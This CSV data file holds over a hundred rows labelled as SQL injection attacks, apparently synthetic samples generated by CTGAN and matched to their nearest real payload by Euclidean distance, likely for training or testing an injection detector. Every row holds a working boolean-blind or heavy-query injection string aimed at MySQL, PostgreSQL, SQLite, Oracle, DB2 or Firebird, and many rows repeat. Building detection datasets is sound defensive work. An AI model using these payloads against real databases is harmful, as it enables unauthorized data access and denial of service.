id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000015,attack,boolean,"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001230,5.108000348503415
CTGAN_000016,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R001388,7.526282361727769
CTGAN_000017,attack,boolean,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'pufu' like 'pufu",nearest_attack_euclidean,R001426,4.727750023001549
CTGAN_000018,attack,boolean,"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc",nearest_attack_euclidean,R001499,5.533815682957064
CTGAN_000019,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000887,5.622018505680783
CTGAN_000020,attack,boolean,"1   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001212,5.057520327484245
CTGAN_000021,attack,boolean,"1'||  (  select 'jscc' from dual where 3266  =  3266 and elt  (  4249  =  4249,7259   )    )   ||'",nearest_attack_euclidean,R000870,4.866272901655384
CTGAN_000022,attack,boolean,"1'   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000605,5.190441210868439
CTGAN_000023,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001157,6.415774166272634
CTGAN_000024,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000773,6.371671829368357
CTGAN_000025,attack,boolean,"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000310,2.8585139323342217
CTGAN_000026,attack,boolean,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",nearest_attack_euclidean,R000125,5.555734499853184
CTGAN_000027,attack,boolean,"1 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001266,7.475161134533781
CTGAN_000028,attack,boolean,"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",nearest_attack_euclidean,R000139,6.522628120700019
CTGAN_000029,attack,boolean,"1   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001212,6.10182821743895
CTGAN_000030,attack,boolean,"-9779'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'hmzj'  =  'hmzj",nearest_attack_euclidean,R000412,5.897579081820976
CTGAN_000031,attack,boolean,"1'+  (  select 'igoi' where 7823  =  7823 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000218,6.345019336816613
CTGAN_000032,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq",nearest_attack_euclidean,R000939,5.289571780876389
CTGAN_000033,attack,boolean,"1'   )    )     )   and make_set  (  7539  =  3946,3946  )   and    (    (     (  'qbpo'  =  'qbpo",nearest_attack_euclidean,R000752,7.115414221252652
CTGAN_000034,attack,boolean,"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""pfea""  =  ""pfea",nearest_attack_euclidean,R000096,5.403204275997573
CTGAN_000035,attack,boolean,"1   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001067,5.981350929484349
CTGAN_000036,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R001127,4.711271506012065
CTGAN_000037,attack,boolean,"1%""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001128,6.118092745521719
CTGAN_000038,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000926,8.91834846323799
CTGAN_000039,attack,boolean,"1   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   7200  =  7200",nearest_attack_euclidean,R000615,2.988994260458818
CTGAN_000040,attack,boolean,"-7802'   )    )     )   or elt  (  8778  =  9974,9974  )   and    (    (     (  'glsq' like 'glsq",nearest_attack_euclidean,R000997,6.750067057275924
CTGAN_000041,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000813,4.675544844912634
CTGAN_000042,attack,boolean,"1'  )   as sjmt where 6541  =  6541 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000639,5.877222143461546
CTGAN_000043,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R000724,5.96897978214494
CTGAN_000044,attack,boolean,"1  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000627,5.358215326935775
CTGAN_000045,attack,boolean,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",nearest_attack_euclidean,R000991,5.735156092909756
CTGAN_000046,attack,boolean,"1  )   where 2888  =  2888 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001182,5.847084898006528
CTGAN_000047,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000454,4.629602391390404
CTGAN_000048,attack,boolean,"1'+  (  select dnxi where 5850  =  5850 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001342,6.5568789335759945
CTGAN_000049,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7711  =  7711",nearest_attack_euclidean,R000901,5.108106249381098
CTGAN_000050,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000813,6.048569121918562
CTGAN_000051,attack,boolean,1'+  (  select ggah where 3263  =  3263 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   +',nearest_attack_euclidean,R000879,4.641437054314813
CTGAN_000052,attack,boolean,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  2160  =  2160",nearest_attack_euclidean,R001297,4.255243712515288
CTGAN_000053,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,nearest_attack_euclidean,R000145,5.241437447307972
CTGAN_000054,attack,boolean,"-7851""   )    )    or 6872  =  6872 and    (    (   ""dvbw"" like ""dvbw",nearest_attack_euclidean,R001459,6.8282230867894915
CTGAN_000055,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",nearest_attack_euclidean,R000403,5.0272557510182745
CTGAN_000056,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000244,5.997442152448353
CTGAN_000057,attack,boolean,"1  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  4557  =  4557",nearest_attack_euclidean,R001433,6.1480809582476645
CTGAN_000058,attack,boolean,1' rlike   (  select   (  case when   (  1916  =  7874  )   then 1 else 0x28 end   )    )    and 'ughq'  =  'ughq,nearest_attack_euclidean,R001324,5.509414657427899
CTGAN_000059,attack,boolean,"1   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   7200  =  7200",nearest_attack_euclidean,R000615,5.46930079930009
CTGAN_000060,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001189,5.572539744474991
CTGAN_000061,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000329,4.438572868097062
CTGAN_000062,attack,boolean,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",nearest_attack_euclidean,R001284,5.2181203364401725
CTGAN_000063,attack,boolean,"1 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001287,4.281535851526501
CTGAN_000064,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000329,4.680391830270407
CTGAN_000065,attack,boolean,"1""   )    )     )   and make_set  (  7809  =  9564,9564  )   and    (    (     (  ""jggk"" like ""jggk",nearest_attack_euclidean,R001416,5.9764187676103475
CTGAN_000066,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R001388,5.577816467671956
CTGAN_000067,attack,boolean,"1'+  (  select dnxi where 5850  =  5850 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001342,7.365387212865952
CTGAN_000068,attack,boolean,"1'+  (  select pepf where 5071  =  5071 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001379,5.449728304337261
CTGAN_000069,attack,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001422,5.088366781933882
CTGAN_000070,attack,boolean,"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'tkcy' like 'tkcy",nearest_attack_euclidean,R001024,4.044759314114737
CTGAN_000071,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001138,6.265450899511205
CTGAN_000072,attack,boolean,"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'sxgl'  =  'sxgl",nearest_attack_euclidean,R001012,5.695000551625075
CTGAN_000073,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R001407,7.56466831110241
CTGAN_000074,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'inec'  =  'inec",nearest_attack_euclidean,R000705,6.473205838443281
CTGAN_000075,attack,boolean,"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001088,5.978738371830461
CTGAN_000076,attack,boolean,"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc",nearest_attack_euclidean,R001499,7.592392611130417
CTGAN_000077,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,nearest_attack_euclidean,R001553,6.914598239880187
CTGAN_000078,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000586,5.289898308610479
CTGAN_000079,attack,boolean,"1'   )    )    as yyja where 4321  =  4321 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000924,5.40808680645531
CTGAN_000080,attack,boolean,"1 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001266,5.2161647620140625
CTGAN_000081,attack,boolean,"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000310,5.648673133983265
CTGAN_000082,attack,boolean,"1   )    )    as rbae where 2049  =  2049 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000986,6.813335854972811
CTGAN_000083,attack,boolean,"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001386,6.498963358517315
CTGAN_000084,attack,boolean,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",nearest_attack_euclidean,R000991,6.0533950090488124
CTGAN_000085,attack,boolean,"1""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000765,4.206178257515055
CTGAN_000086,attack,boolean,"1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  8403,8899   )    )   +'",nearest_attack_euclidean,R001560,4.806013829986826
CTGAN_000087,attack,boolean,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,nearest_attack_euclidean,R000519,6.232543554820726
CTGAN_000088,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'hxcq'  =  'hxcq",nearest_attack_euclidean,R001075,4.8195165602598555
CTGAN_000089,attack,boolean,"1""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""dhss""  =  ""dhss",nearest_attack_euclidean,R001500,6.423805302184656
CTGAN_000090,attack,boolean,"1""   )    )    as dfwi where 9703  =  9703 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000782,4.493540159904205
CTGAN_000091,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""vhey""  =  ""vhey",nearest_attack_euclidean,R000461,6.634109401350088
CTGAN_000092,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001309,6.013091213551651
CTGAN_000093,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'qfwc'  =  'qfwc",nearest_attack_euclidean,R001536,5.819400018598741
CTGAN_000094,attack,boolean,"1  )   as jqbv where 8172  =  8172 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001522,6.305078759155206
CTGAN_000095,attack,boolean,"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'sxgl'  =  'sxgl",nearest_attack_euclidean,R001012,5.1967942146473485
CTGAN_000096,attack,boolean,"1'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000664,5.834018002518227
CTGAN_000097,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000264,5.311091099073055
CTGAN_000098,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'ptou'  =  'ptou",nearest_attack_euclidean,R000848,5.435317807559123
CTGAN_000099,attack,boolean,"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'bmsa'  =  'bmsa",nearest_attack_euclidean,R001107,5.859536204641855
CTGAN_000100,attack,boolean,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""eslo"" like ""eslo",nearest_attack_euclidean,R000619,5.521299455147379
CTGAN_000101,attack,boolean,"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lazm"" like ""lazm",nearest_attack_euclidean,R000234,6.432175744199979
CTGAN_000102,attack,boolean,"1""   )    )     )   and make_set  (  7809  =  9564,9564  )   and    (    (     (  ""jggk"" like ""jggk",nearest_attack_euclidean,R001416,5.182869242117498
CTGAN_000103,attack,boolean,"1""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001197,6.001106164583214
CTGAN_000104,attack,boolean," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000023,7.852601051647377
CTGAN_000105,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R001345,5.2441941042920455
CTGAN_000106,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bzxo' like 'bzxo",nearest_attack_euclidean,R001168,4.437003533490313
CTGAN_000107,attack,boolean,"1""   )    )    rlike   (  select   (  case when   (  8179  =  1246  )   then 1 else 0x28 end   )    )    and    (    (   ""xxeu""  =  ""xxeu",nearest_attack_euclidean,R001202,6.167346257286673
CTGAN_000108,attack,boolean,"-2745'  )   or elt  (  1032  =  1032,3623  )   and   (  'vfxq'  =  'vfxq",nearest_attack_euclidean,R001116,4.496751734885681
CTGAN_000109,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000092,6.384740408568467
CTGAN_000110,attack,boolean,-8301'   )    )     )   or   (  5708  =  5268  )  *5268 and    (    (     (  'hkha'  =  'hkha,nearest_attack_euclidean,R000480,5.292746531251225
CTGAN_000111,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'wvzw'  =  'wvzw",nearest_attack_euclidean,R000265,5.076056856081547
CTGAN_000112,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R001279,6.949465685614135
CTGAN_000113,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""uydm""  =  ""uydm",nearest_attack_euclidean,R000744,5.642997533068729
CTGAN_000114,attack,boolean,-9555'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'rwpq' like 'rwpq,nearest_attack_euclidean,R000444,6.0093721212774724
CTGAN_000115,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R001388,6.4841334127420955
CTGAN_000116,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'ptou'  =  'ptou",nearest_attack_euclidean,R000848,4.941997153208493
CTGAN_000117,attack,boolean,"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001020,4.990844949281052
CTGAN_000118,attack,boolean,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",nearest_attack_euclidean,R000991,6.064928981807064
CTGAN_000119,attack,boolean,"1   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000961,6.574080760079136
CTGAN_000120,attack,boolean,"1'+  (  select nvht where 9118  =  9118 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",nearest_attack_euclidean,R001217,5.250824994592486
CTGAN_000121,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000244,5.222086726189193
CTGAN_000122,attack,boolean,"1%'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000797,7.175706104857958
CTGAN_000123,attack,boolean,"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000995,5.400933827854525
CTGAN_000124,attack,boolean,"1   )    )    as henn where 9980  =  9980 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001336,5.739137889711155
CTGAN_000125,attack,boolean," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000023,5.646286405566631
CTGAN_000126,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""uydm""  =  ""uydm",nearest_attack_euclidean,R000744,5.2347593745425325
CTGAN_000127,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000142,5.6107174412255505
CTGAN_000128,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000433,5.345176057521916
CTGAN_000129,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001309,5.857331800997736
CTGAN_000130,attack,boolean,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  2160  =  2160",nearest_attack_euclidean,R001297,5.707976914815499
CTGAN_000131,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- izad,nearest_attack_euclidean,R000437,4.887240690148212
CTGAN_000132,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000450,4.683621127976596
CTGAN_000133,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'pgyl'  =  'pgyl",nearest_attack_euclidean,R000420,4.525650236531398
CTGAN_000134,attack,boolean,"1' or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000911,4.402407869847988
CTGAN_000135,attack,boolean,"1'+  (  select afst where 7454  =  7454 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",nearest_attack_euclidean,R000137,7.888272344542742
CTGAN_000136,attack,boolean,"1%""   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001208,6.1720314573950805
CTGAN_000137,attack,boolean,"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'obmu'  =  'obmu",nearest_attack_euclidean,R000603,6.618522963301613
CTGAN_000138,attack,boolean,"1""  )   and make_set  (  4539  =  6401,6401  )   and   (  ""kglx""  =  ""kglx",nearest_attack_euclidean,R000375,5.5149316066629765
CTGAN_000139,attack,boolean,"1  )   as vzyk where 5103  =  5103 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R001013,6.288438669332694
CTGAN_000140,attack,boolean,"1%""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000593,6.217352167813548
